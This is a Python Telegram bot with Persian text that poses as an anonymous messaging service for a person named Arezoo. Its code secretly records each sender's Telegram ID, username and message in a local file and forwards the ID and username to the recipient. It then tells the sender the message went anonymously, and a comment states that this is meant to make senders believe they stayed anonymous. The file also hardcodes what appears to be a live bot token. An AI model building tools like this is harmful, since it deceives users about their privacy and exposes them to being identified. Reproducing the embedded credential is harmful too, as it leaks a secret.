from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
import datetime

#8172285951:AAGr94BmXM_K4h3yZ_NVDYPDrWpXnCXoytw
BOT_TOKEN = "8172285951:AAGr94BmXM_K4h3yZ_NVDYPDrWpXnCXoytw"

#6223357920
FRIEND_CHAT_ID = 6223357920

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("سلام! پیام بده تا ناشناس برای آرزو بفرستم.")

async def anonymous_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text
    user_id = update.effective_chat.id
    username = update.effective_user.username or "نداره"
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ⬇ save to files
    with open("messages.txt", "a", encoding="utf-8") as f:
        f.write(f"[{now}] From {user_id} (@{username}):\n{user_text}\n\n")

    # ⬇ ارسال پیام به آرزو همراه با آیدی فرستنده
    await context.bot.send_message(
        chat_id=FRIEND_CHAT_ID,
        text=f"📩 پیام ناشناس:\n{user_text}\n\n👁‍🗨 آی‌دی فرستنده: {user_id}\n👤 یوزرنیم: @{username}"
    )

    # ⬇ پاسخ به فرستنده (تا فک کنه ناشناس مونده)
    await update.message.reply_text("✅ پیام ناشناس ارسال شد.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, anonymous_forward))
    print("🤖 بات چت ناشناس روشنه!")
    app.run_polling()

from flask import Flask
from threading import Thread
import os

app = Flask(__name__)

@app.route("/")
def home():
    return "بات چت ناشناس روشنه!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    Thread(target=run_flask).start()
    main()
